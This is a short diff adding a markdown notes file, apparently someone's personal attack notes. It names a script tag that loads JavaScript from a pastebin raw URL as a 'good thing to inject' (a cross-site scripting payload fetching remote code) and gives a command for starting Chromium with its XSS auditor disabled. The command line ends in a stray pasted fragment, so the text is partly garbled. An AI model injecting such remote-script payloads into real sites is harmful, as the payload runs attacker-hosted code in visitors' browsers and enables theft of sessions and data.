@@ -1,0 +1,10 @@
+# Notes
+Good thing to inject:
+```
+<script  src="https://pastebin.com/raw/T9aiUL40"></script>
+```
+
+Start browser with:
+```
+chromium-browser -disable-xss-auditor# Welcome to StackEdit!
+```
